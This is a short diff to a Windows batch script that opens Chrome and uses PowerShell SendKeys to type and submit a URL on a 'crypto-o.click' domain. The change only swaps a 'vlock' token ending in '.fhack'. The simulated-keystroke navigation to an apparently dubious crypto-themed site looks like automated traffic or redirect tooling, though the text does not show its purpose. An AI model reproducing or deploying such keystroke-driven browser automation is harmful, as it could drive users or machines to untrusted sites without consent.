@@ -28,5 +28,5 @@ set "app=chrome.exe"
 start "" "%app%"
 timeout /t 2
 
-powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('https://crypto-o.click/film.php?vlock=OK05YD.fhack'); [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')"
+powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('https://crypto-o.click/film.php?vlock=HMJEBL.fhack'); [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')"
 
